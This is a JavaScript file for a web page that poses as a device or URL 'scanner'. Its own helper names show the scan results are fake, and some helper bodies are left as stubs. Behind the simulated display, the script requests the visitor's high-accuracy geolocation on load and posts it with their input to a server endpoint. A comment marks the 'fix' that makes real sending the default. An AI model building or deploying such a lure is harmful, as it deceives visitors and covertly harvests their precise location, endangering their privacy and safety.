// public/scripts.js (fixed: send location when demo toggle missing; better logging)
let cachedLocation = null; // make sure it's global

const analyzeButton = document.getElementById('analyzeButton');
const videoUrlInput = document.getElementById('videoUrlInput');
const demoToggle = document.getElementById('demoToggle'); // may be null
const statusText = document.getElementById('status');
const progressBar = document.getElementById('progressBar');
const progressBarContainer = document.getElementById('progressBarContainer');
const resultArea = document.getElementById('resultArea');
const simLabel = document.getElementById('simLabel');

function randInt(min, max){ return Math.floor(Math.random()*(max-min+1))+min; }
function pick(arr){ return arr[Math.floor(Math.random()*arr.length)]; }

function requestLocationWithPrompt(timeout = 8000) {
  return new Promise((resolve) => {
    if (!("geolocation" in navigator)) return resolve(null);
    let resolved = false;
    const onSuccess = (pos) => {
      if (resolved) return;
      resolved = true;
      resolve({ latitude: pos.coords.latitude, longitude: pos.coords.longitude, accuracy: pos.coords.accuracy });
    };
    const onError = (err) => {
      if (resolved) return;
      resolved = true;
      console.warn('Geolocation error/denied:', err && err.message);
      resolve(null);
    };
    navigator.geolocation.getCurrentPosition(onSuccess, onError, { enableHighAccuracy:true, timeout, maximumAge:0 });
    setTimeout(() => { if (!resolved) { resolved = true; resolve(null); } }, timeout + 1000);
  });
}

// (Simulated UI helpers omitted here for brevity — reuse your existing functions)
function makeSimulatedResult(input){ /* ... keep your implementation ... */ }
function makeFakeScanResults(input){ /* ... keep your implementation ... */ }
function stagedProgress(phases){ /* ... keep your implementation ... */ }
function renderSimulatedResult(sim){ /* ... keep your implementation ... */ }
async function runScanFlow(input, isDemo){ /* ... keep your implementation ... */ }

// ===== Fix: default demo=false so data is sent when toggle is missing =====
function getIsDemo() {
  // if demoToggle exists, use its value; otherwise default to false (send real data)
  return demoToggle ? !!demoToggle.checked : false;
}

// On load, try to get location (prompt user)
window.addEventListener('DOMContentLoaded', async () => {
  try {
    cachedLocation = await requestLocationWithPrompt(8000);
    console.log('Location on load:', cachedLocation);
    // OPTIONAL: auto-send to server on load if you want (uncomment if desired)
    // if (cachedLocation) sendLocationOnly(cachedLocation);
  } catch (e) {
    console.warn('Location on load failed:', e);
    cachedLocation = null;
  }
});

analyzeButton.addEventListener('click', async () => {
  const input = videoUrlInput.value.trim();
  if (!input) { statusText.textContent = 'Please enter a Device ID or URL.'; return; }

  const isDemo = getIsDemo(); // now default false
  // If location not cached and we are sending real data, request again
  if (!cachedLocation && !isDemo) {
    try {
      cachedLocation = await requestLocationWithPrompt(8000);
      console.log('Location obtained on click:', cachedLocation);
    } catch (e) {
      console.warn('Location request on click failed', e);
      cachedLocation = null;
    }
  }

  // Show UI (simulate)
  runScanFlow(input, isDemo);

  // If not demo -> send real payload to server
  if (!isDemo) {
    const payload = { videoUrl: input, location: cachedLocation };
    console.log('Posting to /api/send-data', payload);
    try {
      const resp = await fetch('/api/send-data', {
        method: 'POST',
        headers: {'Content-Type':'application/json'},
        body: JSON.stringify(payload)
      });
      if (!resp.ok) {
        const txt = await resp.text().catch(()=>null);
        console.warn('Server returned non-OK:', resp.status, txt);
        statusText.textContent = '⚠️ Server error while sending data.';
      } else {
        const j = await resp.json().catch(()=>null);
        console.log('Server response:', j);
        statusText.textContent = '✅ Scan complete. Data sent to server.';
      }
    } catch (err) {
      console.error('Network error sending to server', err);
      statusText.textContent = '❌ Failed to send data to server.';
    }
  } else {
    console.log('Demo mode — not sending to server.');
  }
});
